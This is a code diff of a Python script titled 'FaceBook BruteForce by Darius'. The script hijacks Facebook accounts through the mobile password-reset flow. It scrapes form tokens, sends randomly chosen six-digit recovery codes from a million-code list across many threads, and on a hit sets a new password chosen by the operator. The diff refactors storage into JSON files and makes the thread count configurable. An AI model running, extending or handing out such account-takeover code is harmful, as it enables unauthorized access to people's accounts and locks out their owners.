@@ -1,5 +1,5 @@
 #coding: utf-8
-import requests, time, sys, os, re, random, ast
+import requests, sys, os, re, random, json
 from multiprocessing.pool import ThreadPool
 logo=""" \033[1;92m███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
 ██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝
@@ -8,6 +8,10 @@ logo=""" \033[1;92m███████╗ █████╗  █████�
 ██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗
 ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
 BruteForce by Darius:"""
+if sys.platform == "linux" or sys.platform == "linux2":
+    clr="clear"
+elif sys.platform == "win32" or sys.platform == "cygwin" or sys.platform == "msys":
+    clr="cls"
 if sys.version_info[0] != 3:
   os.system('clear')
   print(logo)
@@ -79,6 +83,7 @@ def search():
             for i in web.cookies:
               COOKIES[i.name] = i.value
             return COOKIES, FORM, ACTION, web.url
+          
           else:
             print("\033[1;92m No recover method found")
             input()
@@ -125,15 +130,15 @@ def send_req():
       FORMS['jazoest']=re.findall(r'name="jazoest" value="(.*?)"', web.text).pop(0)
       FORMS['reset_action'] = re.findall(r'type="submit" value="(.*?)"', web.text).pop(0)
       URL = URL.replace("amp;", "")
-      ok = open("cach.txt", "w")
+      ok = open("urls.txt", "w")
       ok.write(str(URL))
       ok.close()
-      no = open("cookies.txt", "w")
-      no.write(str(COOKIES))
-      no.close()
-      yes = open("form.txt", "w")
-      yes.write(str(FORMS))
-      yes.close()
+      a = open("cookies.json", "w")
+      json.dump(COOKIES, a)
+      a.close()
+      a = open("form.json", "w")
+      json.dump(FORMS, a)
+      a.close()
       return True
     except:
       pass
@@ -156,68 +161,59 @@ def machine_generator():
     else:
       passcode.append(str(i))
   return passcode
-def machine_change_pass(url, COOKIES, form):
+def machine_change_pass(url, s, form):
   header['Referer']=open("cach.txt", "r").read()
   try:
-    web=session.post(url, headers=header, cookies=COOKIES, json=form)
+    web=s.post(url, headers=header, data=form)
     print(web.text)
     return True
   except:
     return False
-def machine_sender(FORMS,COOKIES,Url):
+def machine_sender(forms, s, url):
   while True:
     try:
-      web = session.post(Url, headers=header, data=FORMS, cookies=COOKIES)
-      return web
+      web = s.post(url, headers=header, data=forms)
+      return web, s
     except:
       pass
-def elsi(web, COOKIES, FORMS):
-  rl = ("https://m.facebook.com:443"+re.findall(r'<form method="post" action="(.*?)" id=', web.text).pop(0))
-  Url = rl.replace("amp;", "")
-  FORMS['lsd']=re.findall(r'name="lsd" value="(.*?)"', web.text).pop(0)
-  FORMS['jazoest'] = re.findall(r'name="jazoest" value="(.*?)"', web.text).pop(0)
+def elsi(web, body):
+  url = ("https://m.facebook.com:443"+re.findall(r'<form method="post" action="(.*?)" id=', web.text).pop(0))
+  url = url.replace("amp;", "")
+  body['lsd']=re.findall(r'name="lsd" value="(.*?)"', web.text).pop(0)
+  body['jazoest'] = re.findall(r'name="jazoest" value="(.*?)"', web.text).pop(0)
  # FORMS['reset_action'] = 'Magpatuloy'
-  FORMS['reset_action'] = re.findall(r'<button type="submit" value="(.*?)"', web.text).pop(0)
-  for i in web.cookies:
-    COOKIES[i.name] = i.value
-  return FORMS, COOKIES, Url
-def machine_found(web, COOKIES):
+  body['reset_action'] = re.findall(r'<button type="submit" value="(.*?)"', web.text).pop(0)
+  return body, url
+def machine_found(web):
   form=dict()
   form['lsd']=re.findall(r'name="lsd" value="(.*?)"', web.text).pop(0)
   form['jazoest']=re.findall(r'name="jazoest" value="(.*?)"', web.text).pop(0)
   form['password_new']=str(userpass)
   ac_url=('https://m.facebook.com:443'+re.findall(r'form method="post" action="(.*?)">', web.text).pop(0))
   ac_url=ac_url.replace("amp;", "")
-  return ac_url, COOKIES, form
-  for i in web.cookies:
-    COOKIES[i.name]=i.value
+  return ac_url, form
 def hackie(arg):
-  global RUN
-  Url = open("cach.txt", "r").read()
-  f = open("form.txt", "r").read()
-  FORMS = ast.literal_eval(f)
-  e = open("cookies.txt", "r").read()
-  COOKIES = ast.literal_eval(e)
-  header['Referer']=Url
+  global RUN, session, codelist
+  body = json.loads(open("form.json", "r").read())
+  cookie = json.loads(open("cookies.json", "r").read())
+  header['Referer']=open("cach.txt", "r").read()
+  url = open("cach.txt", "r").read()
   while bool(RUN) == True:
-    FORMS["ri"]=""
-    FORMS["rpm"]=""
-    FORMS["sr"]=""
     try:
-      pin = random.choice(CODIE)
-      if len(CODIE) == 1000000:
+      pin = random.choice(codelist)
+      if len(codelist) == 1000000:
         pass
       else:
-        sys.stdout.write(u'\033[1000D\033[1;97m {}  \033[1;92m {}'.format(str(len(CODIE)), str(pin)))
+        sys.stdout.write(u'\033[1000D\033[1;97m {}  \033[1;92m {}'.format(str(len(codelist)), str(pin)))
         sys.stdout.flush()
-      FORMS["n"]=str(pin)
-      web=machine_sender(FORMS, COOKIES, Url)
+      body["n"]=str(pin)
+      web = session.post(url, headers = header, cookies = cookie, data = body)
       if 'password_new' in web.text:
         RUN = False
         print("FOUND CODE {}".format(str(pin)))
         
-        ac_url, COOKIES, form = machine_found(web, COOKIES)
-        if machine_change_pass(ac_url, COOKIES, form):
+        ac_url, form = machine_found(web)
+        if machine_change_pass(ac_url, session, form):
           print("DONE CHANGE PASSWORD {}".format(str(userpass)))
           return
         else:
@@ -227,25 +223,27 @@ def hackie(arg):
         RUN = False
         return
       else:
-        FORMS, COOKIES, Url = elsi(web, COOKIES, FORMS)
+        body, url = elsi(web, body)
         header['Referer'] = web.url
-        CODIE.remove(str(pin))
+        cookie = session.cookies.get_dict()
+        codelist.remove(str(pin))
     except:
       pass
   return
-os.system("reset")
-os.system("clear")
+os.system(clr)
 print(logo)
 print(67 * '\033[1;92m=')
 print("email/number:")
 user =pick()
 print("\033[1;92mpassword if gotten")
 userpass = pick()
+print("\033[1;92mThreads")
+threads = pick()
 print('\npassword to change = {}'.format(userpass))
-CODIE = machine_generator()
+codelist = machine_generator()
 if __name__=="__main__":
   print(67 * '\033[1;92m=')
   if send_req():
-    p=ThreadPool(150)
-    p.map(hackie, range(150))
+    p=ThreadPool(int(threads))
+    p.map(hackie, range(int(threads)))
     print("\033[1;97m DONE")
